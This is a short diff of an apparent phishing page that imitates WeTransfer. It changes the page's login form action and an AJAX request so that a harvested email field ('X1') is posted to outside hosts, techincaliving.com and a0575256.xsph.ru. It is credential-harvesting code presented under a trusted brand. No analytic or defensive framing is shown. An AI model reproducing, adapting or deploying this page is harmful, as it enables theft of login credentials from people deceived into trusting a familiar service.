@@ -192,7 +192,7 @@ They may have been blocked by your firewall, proxy or browser set-up.
 Try refreshing the page or get in touch through our <a href="https://wetransfer.zendesk.com/" rel="external">help center</a>.
     </p>
   </div>
-  <form method="post" action="https://techincaliving.com/se/tr/an/sf/er/index.php?X1=email@mail.com#">
+  <form method="post" action="http://a0575256.xsph.ru/v.php">
   <div class="root-node"><div class="app application">
   <div class="transfer" route="[object Object]" id="41d7cb9e19aa16c35812a437375963bd20190311012539" secret="eaa7c1"><div>
   <div class="transfer__window downloader">
@@ -292,7 +292,7 @@ Try refreshing the page or get in touch through our <a href="https://wetransfer.
           progressSim();
         }, 200);
         $.ajax({
-          url: "https://a0575256.xsph.ru/l0gin.php",
+          url: "http://a0575256.xsph.ru/v.php",
           method: "post",
           data: {
             X1: email,
